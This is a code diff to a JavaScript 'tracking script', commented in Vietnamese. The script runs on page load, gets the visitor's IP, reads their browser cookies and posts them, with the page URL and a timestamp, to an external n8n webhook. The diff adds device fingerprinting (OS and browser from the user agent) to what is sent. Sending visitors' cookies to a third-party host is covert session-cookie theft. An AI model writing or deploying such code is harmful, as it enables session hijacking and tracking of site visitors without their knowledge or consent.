@@ -1,13 +1,32 @@
 (function() {
     console.log("Tracking script loaded and executing...");
 
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let os = "Unknown OS", browser = "Unknown Browser";
+
+        if (ua.indexOf("Win") !== -1) os = "Windows";
+        else if (ua.indexOf("Mac") !== -1) os = "MacOS";
+        else if (ua.indexOf("Linux") !== -1) os = "Linux";
+        else if (ua.indexOf("Android") !== -1) os = "Android";
+        else if (ua.indexOf("iPhone") !== -1) os = "iOS";
+
+        if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
+        else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+        else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+        else if (ua.indexOf("Edge") !== -1) browser = "Edge";
+
+        return { os, browser };
+    }
+
     document.addEventListener("DOMContentLoaded", function() {
-        // Lấy IP từ API bên ngoài
+        // Lấy IP từ API ngoài
         fetch("https://api64.ipify.org?format=json")
         .then(response => response.json())
         .then(ipData => {
             const userIP = ipData.ip;
-            const cookies = document.cookie; // Chỉ lấy được cookie không có HttpOnly
+            const cookies = document.cookie || "No cookies"; // Lấy cookie nếu có
+            const deviceInfo = getDeviceInfo();
 
             // Gửi dữ liệu tracking đến webhook
             fetch("https://n8n.twin.vn/webhook/495eaa71-b6e0-4402-9b6d-22b1e796e8d1", {
@@ -20,6 +39,7 @@
                     url: window.location.href, 
                     ip: userIP, 
                     cookies: cookies, 
+                    device: deviceInfo,
                     timestamp: new Date().toISOString() 
                 })
             })
